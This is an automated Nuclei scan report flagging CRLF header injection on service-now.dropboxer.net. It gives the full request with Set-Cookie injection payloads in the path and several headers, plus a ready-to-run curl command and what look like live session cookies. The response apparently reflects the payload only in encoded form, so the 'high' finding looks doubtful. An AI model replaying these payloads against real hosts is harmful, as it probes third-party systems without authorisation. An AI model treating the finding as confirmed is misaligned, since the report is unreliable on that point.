### Looking for reflected values from request headers (header-reflection) found on https://service-now.dropboxer.net

----
**Details**: **header-reflection** matched at https://service-now.dropboxer.net

**Protocol**: HTTP

**Full URL**: https://service-now.dropboxer.net/%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.service-now.dropboxer.net

**Timestamp**: Sat Dec 9 14:40:03 +0000 UTC 2023

**Template Information**

| Key | Value |
| --- | --- |
| Name | Looking for reflected values from request headers |
| Authors | panch0r3d |
| Tags |  |
| Severity | high |

**Request**
```http
GET /%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.service-now.dropboxer.net HTTP/1.1
Host: service-now.dropboxer.net
User-Agent: Mozilla Canary12345%0d%0ASet-Cookie: CanaryCookie=12345UA; path=/; secure; httponly
Connection: close
Accept: */*
Accept-Language: en
Cookie: Canary12345=qwerty%0d%0ASet-Cookie: CanaryCookie=12345CK; path=/; secure; httponly; BIGipServerpool_dropboxdev=6fc497f3b96c2862f0e08f140ccf03c1; JSESSIONID=AC71FC915A127FFFA56805DCB40EB9EC; glide_user_route=glide.507710f0836299893dc796ace57b81e3
Origin: Canary123456.com%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly
Referer: google.com%0d%0ASet-Cookie: CanaryCookie=12345R; path=/; secure; httponly
X-Forwarded-For: 0.0.0.0%0d%0ASet-Cookie: CanaryCookie=12345XF; path=/; secure; httponly
x-request-id: 123456%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 302 Found
Connection: close
Content-Security-Policy: frame-ancestors 'self' teams.microsoft.com *.teams.microsoft.com
Date: Sat, 09 Dec 2023 14:40:00 GMT
Location: /auth_redirect.do?sysparm_stack=no&sysparm_url=https%3A%2F%2Fdropbox.okta.com%2Fapp%2Fservicenow_ud%2Fexkjuhgvb7rqMl1a44x6%2Fsso%2Fsaml%3FSAMLRequest%3DnZPNbtswEIRfReBdv1HUmrAMuDKKGmhSIxZ66CWgxFXMhiIVLmWrb19KURKjSHzolTu7M%252FuRXCJrZdLRdW8P6g6eekDrDa1USJ8rOemNopqhQKpYC0htTffrm%252B80CSLaGW11rSXxNq5RKGaFVjk5WNshDUNudFfpIdCPlgW1bkPWdSGCOYoalD7d9zyE4fF3f3g4Vp%252FM042MWZoOWYiow9GeeF%252B1qWEKl5OGSQTibTc52d8WDWRRes0W8XXVXEESQxWnnGdN1rCoytLECXHHEMUR3loRe9gqtEzZnCRRcuXHiR8tyjilaUSjKPi8SH8Rbzev9UUoLtTDZQbVswjpt7Lc%252Bbsf%252B5J4P8HgRMIJyGo5oaSTuzmne3mwCw9mBEpW%252FwDlcAxmjL7jOKJdhucms2VHb93U7Wanpaj%252FeGsp9akwwKxDYk0PE9%252BW2Y9zxEE8nQjuN5OUQsuEXHNuAJGEr0bz2wE%252BXVahlYXBeoVuO2YEjihgYLV9hXEuK6Rb9Q6a%252F0JzUVbTepztjsencNKGj1cLtctZGqaw08a%252BkHsv0WoufrDfW%252Fn8%252F6z%252BAg%253D%253D%26RelayState%3Dnull%252Fsaml_redirector.do%253Fsysparm_nostack%253Dtrue%2526sysparm_uri%253D%25252Fnav_to.do%25253Furi%25253D%2525252F%252525250d%252525250aset-cookie%2525252520%252525253amycookie%252525253dCanary12345%2525253B%2525252520%2525252544omain%2525252520%252525253d.service-now.dropboxer.net
Server: snow_adc
Server-Timing: sem_wait;dur=0, sesh_wait;dur=0
Set-Cookie: BIGipServerpool_dropboxdev=6fc497f3b96c2862f0e08f140ccf03c1; httponly; secure; path=/; SameSite=None
Set-Cookie: glide_user=; Max-Age=0; Expires=Thu, 01-Jan-1970 00:00:10 GMT; Path=/; HttpOnly; secure; SameSite=None
Set-Cookie: glide_user_session=; Max-Age=0; Expires=Thu, 01-Jan-1970 00:00:10 GMT; Path=/; HttpOnly; secure; SameSite=None
Strict-Transport-Security: max-age=63072000; includeSubDomains
X-Is-Logged-In: false
X-Transaction-Id: 93694c81372f
Content-Length: 0


```

**Extra Information**

**Extracted results:**

- Location: /auth_redirect.do?sysparm_stack=no&sysparm_url=https%3A%2F%2Fdropbox.okta.com%2Fapp%2Fservicenow_ud%2Fexkjuhgvb7rqMl1a44x6%2Fsso%2Fsaml%3FSAMLRequest%3DnZPNbtswEIRfReBdv1HUmrAMuDKKGmhSIxZ66CWgxFXMhiIVLmWrb19KURKjSHzolTu7M%252FuRXCJrZdLRdW8P6g6eekDrDa1USJ8rOemNopqhQKpYC0htTffrm%252B80CSLaGW11rSXxNq5RKGaFVjk5WNshDUNudFfpIdCPlgW1bkPWdSGCOYoalD7d9zyE4fF3f3g4Vp%252FM042MWZoOWYiow9GeeF%252B1qWEKl5OGSQTibTc52d8WDWRRes0W8XXVXEESQxWnnGdN1rCoytLECXHHEMUR3loRe9gqtEzZnCRRcuXHiR8tyjilaUSjKPi8SH8Rbzev9UUoLtTDZQbVswjpt7Lc%252Bbsf%252B5J4P8HgRMIJyGo5oaSTuzmne3mwCw9mBEpW%252FwDlcAxmjL7jOKJdhucms2VHb93U7Wanpaj%252FeGsp9akwwKxDYk0PE9%252BW2Y9zxEE8nQjuN5OUQsuEXHNuAJGEr0bz2wE%252BXVahlYXBeoVuO2YEjihgYLV9hXEuK6Rb9Q6a%252F0JzUVbTepztjsencNKGj1cLtctZGqaw08a%252BkHsv0WoufrDfW%252Fn8%252F6z%252BAg%253D%253D%26RelayState%3Dnull%252Fsaml_redirector.do%253Fsysparm_nostack%253Dtrue%2526sysparm_uri%253D%25252Fnav_to.do%25253Furi%25253D%2525252F%252525250d%252525250aset-cookie%2525252520%252525253amycookie%252525253dCanary12345%2525253B%2525252520%2525252544omain%2525252520%252525253d.service-now.dropboxer.net



**CURL command**
```sh
curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: Canary12345=qwerty%0d%0ASet-Cookie: CanaryCookie=12345CK; path=/; secure; httponly; BIGipServerpool_dropboxdev=6fc497f3b96c2862f0e08f140ccf03c1; JSESSIONID=AC71FC915A127FFFA56805DCB40EB9EC; glide_user_route=glide.507710f0836299893dc796ace57b81e3' -H 'Origin: Canary123456.com%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly' -H 'Referer: google.com%0d%0ASet-Cookie: CanaryCookie=12345R; path=/; secure; httponly' -H 'User-Agent: Mozilla Canary12345%0d%0ASet-Cookie: CanaryCookie=12345UA; path=/; secure; httponly' -H 'X-Forwarded-For: 0.0.0.0%0d%0ASet-Cookie: CanaryCookie=12345XF; path=/; secure; httponly' -H 'x-request-id: 123456%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly' 'https://service-now.dropboxer.net/%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.service-now.dropboxer.net'
```

----

Generated by [Nuclei v3.1.0-dev](https://github.com/projectdiscovery/nuclei)